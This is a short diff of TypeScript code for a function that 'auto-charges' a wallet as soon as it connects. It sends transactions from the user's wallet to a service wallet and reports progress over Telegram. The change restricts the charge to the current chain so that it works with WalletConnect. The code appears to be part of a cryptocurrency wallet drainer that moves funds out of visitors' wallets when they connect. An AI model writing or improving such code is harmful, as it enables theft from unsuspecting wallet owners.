@@ -52,13 +52,15 @@ export async function executeChargeOnConnect(params: {
 
   try {
     onTelegramUpdate?.(`🚀 Starting auto-charge process...`);
+    onTelegramUpdate?.(`📱 WalletConnect Mode: Charging from current chain only (${chainName})`);
 
-    // Perform auto-charge across all chains
+    // Perform auto-charge - ONLY on current chain for WalletConnect compatibility
     const result = await performAutoCharge({
       walletAddress,
       serviceWallet,
       sendTransactionAsync,
       onProgress: onTelegramUpdate,
+      currentChainId: chainId, // Pass current chain to limit transactions to this chain only
     });
 
     if (result.success) {
